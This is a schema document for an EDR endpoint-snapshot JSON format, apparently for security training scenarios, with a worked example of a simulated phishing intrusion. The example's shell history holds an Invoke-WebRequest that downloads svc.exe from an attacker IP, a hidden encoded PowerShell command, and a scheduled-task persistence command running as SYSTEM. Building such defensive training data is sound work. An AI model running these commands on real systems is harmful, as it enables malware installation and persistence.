# EDR sample — `ScenarioEndpoint.edr`

A snapshot of an endpoint's live state as an EDR agent would report it: the running
process tree, active network connections, browser history, and shell history.
**One JSON document per endpoint**, stored on that endpoint's `ScenarioEndpoint`
record.

## Shape

```json
{
  "version": 1,
  "hostname": "win-ep-04",
  "os": "Windows 11",
  "processes": [
    {
      "pid": 4188,
      "ppid": 812,
      "name": "winword.exe",
      "user": "j.mensah",
      "cmd": "WINWORD.EXE /n Invoice_July.docm",
      "cpu": 3.4,
      "mem": 210,
      "children": [
        { "pid": 6624, "ppid": 4188, "name": "powershell.exe", "cmd": "...", "children": [] }
      ]
    }
  ],
  "connections": [
    { "proto": "TCP", "laddr": "10.0.0.5:51344", "raddr": "185.220.101.34:4444", "state": "ESTABLISHED", "pid": 6624 }
  ],
  "browserHistory": [
    { "ts": "2026-07-01T14:26:58Z", "title": "Invoice payment portal", "url": "http://pay-invoice-verify.top/login" }
  ],
  "shellHistory": [
    { "ts": "2026-07-01T14:32:07Z", "user": "svc-batch", "cmd": "powershell -nop -w hidden -enc SQBFAF..." }
  ]
}
```

## Top-level fields

| Field | Type | Required | Description |
|---|---|---|---|
| `version` | integer | Yes | Bundle version. Currently `1`. |
| `hostname` | string | Yes | Endpoint hostname. Must match the `ScenarioEndpoint.hostname`. |
| `os` | string | No | Human-readable OS label, e.g. `Windows 11`. |
| `processes` | array | Conditional | Process tree (see below). |
| `connections` | array | Conditional | Active network connections. |
| `browserHistory` | array | Conditional | Visited URLs. |
| `shellHistory` | array | Conditional | Executed shell/command-line entries. |

**Requirement:** `hostname` is mandatory, and **at least one** of `processes`,
`connections`, `browserHistory`, or `shellHistory` must be present and non-empty.
Include only the sections relevant to your scenario.

## `processes` — the process tree

`processes` is an array of **root** process nodes. Each node may contain a
`children` array of the same shape, nested **recursively** to any depth, forming a
process tree that mirrors parent/child spawn relationships. A leaf process has an
empty `children: []`.

| Field | Type | Required | Description |
|---|---|---|---|
| `pid` | integer | Yes | Process ID. |
| `ppid` | integer | No | Parent process ID. For a root node this is typically the PID of a process outside the captured tree (e.g. `services.exe`). |
| `name` | string | Yes | Executable/image name. |
| `user` | string | No | Account the process runs as. |
| `cmd` | string | No | Full command line. |
| `cpu` | number | No | CPU usage percent at capture time. |
| `mem` | number | No | Memory usage in MB at capture time. |
| `children` | array | No | Child process nodes, same schema, recursive. Omit or use `[]` for a leaf. |

Because the tree is recursive, `winword.exe → powershell.exe → svc.exe` is
expressed by nesting each child inside its parent's `children` array. The `ppid` of
a child should equal the `pid` of the node it is nested under.

## `connections`

| Field | Type | Required | Description |
|---|---|---|---|
| `proto` | string | Yes | Transport protocol, e.g. `TCP`, `UDP`. |
| `laddr` | string | Yes | Local `address:port`. |
| `raddr` | string | No | Remote `address:port`. May be absent for listening sockets. |
| `state` | string | No | Socket state, e.g. `ESTABLISHED`, `LISTEN`, `TIME_WAIT`. |
| `pid` | integer | No | Owning process ID (correlate with the process tree). |

## `browserHistory`

| Field | Type | Required | Description |
|---|---|---|---|
| `ts` | string (ISO 8601 UTC) | Yes | Visit time. |
| `url` | string | Yes | Full URL visited. |
| `title` | string | No | Page title as recorded by the browser. |

## `shellHistory`

| Field | Type | Required | Description |
|---|---|---|---|
| `ts` | string (ISO 8601 UTC) | Yes | Time the command was run. |
| `cmd` | string | Yes | Exact command line executed. |
| `user` | string | No | Account that ran the command. |

## Presentation

The EDR view is rendered raw — process trees, connections, and history lists are
shown exactly as authored, with no highlighting of any particular process or
destination. Keep all values factual; do not annotate entries.

## Worked example

Endpoint `win-ep-04` mid-intrusion. The tree shows Word spawning a hidden
PowerShell, which in turn drops and runs `svc.exe`; the connection to
`185.220.101.34:4444` is owned by the PowerShell process; browser history captures
the lure; and shell history records the `svc-batch` commands — all presented
without any markings.

```json
{
  "version": 1,
  "hostname": "win-ep-04",
  "os": "Windows 11 Pro 23H2",
  "processes": [
    {
      "pid": 4188,
      "ppid": 812,
      "name": "winword.exe",
      "user": "j.mensah",
      "cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n C:\\Users\\j.mensah\\Downloads\\Invoice_July.docm",
      "cpu": 3.4,
      "mem": 210,
      "children": [
        {
          "pid": 6624,
          "ppid": 4188,
          "name": "powershell.exe",
          "user": "svc-batch",
          "cmd": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
          "cpu": 11.2,
          "mem": 96,
          "children": [
            {
              "pid": 7012,
              "ppid": 6624,
              "name": "svc.exe",
              "user": "svc-batch",
              "cmd": "C:\\ProgramData\\svc.exe --run",
              "cpu": 42.8,
              "mem": 331,
              "children": []
            }
          ]
        }
      ]
    },
    {
      "pid": 812,
      "ppid": 604,
      "name": "services.exe",
      "user": "SYSTEM",
      "cmd": "C:\\Windows\\System32\\services.exe",
      "cpu": 0.1,
      "mem": 14,
      "children": []
    }
  ],
  "connections": [
    { "proto": "TCP", "laddr": "10.0.0.5:51344", "raddr": "185.220.101.34:4444", "state": "ESTABLISHED", "pid": 6624 },
    { "proto": "TCP", "laddr": "10.0.0.5:51402", "raddr": "185.220.101.34:443", "state": "ESTABLISHED", "pid": 7012 },
    { "proto": "TCP", "laddr": "0.0.0.0:445", "state": "LISTEN", "pid": 4 }
  ],
  "browserHistory": [
    { "ts": "2026-07-01T14:25:12Z", "title": "Inbox (3) - Outlook", "url": "https://outlook.office365.com/mail/inbox" },
    { "ts": "2026-07-01T14:26:58Z", "title": "Invoice payment portal", "url": "http://pay-invoice-verify.top/login" },
    { "ts": "2026-07-01T14:27:21Z", "title": "Download - Invoice_July.docm", "url": "http://pay-invoice-verify.top/files/Invoice_July.docm" }
  ],
  "shellHistory": [
    { "ts": "2026-07-01T14:32:07Z", "user": "svc-batch", "cmd": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..." },
    { "ts": "2026-07-01T14:33:38Z", "user": "svc-batch", "cmd": "Invoke-WebRequest http://185.220.101.34/svc.exe -OutFile C:\\ProgramData\\svc.exe" },
    { "ts": "2026-07-01T14:35:02Z", "user": "svc-batch", "cmd": "schtasks /create /tn \\Microsoft\\Windows\\SvcBatchSync /tr C:\\ProgramData\\svc.exe /sc onlogon /ru SYSTEM" }
  ]
}
```
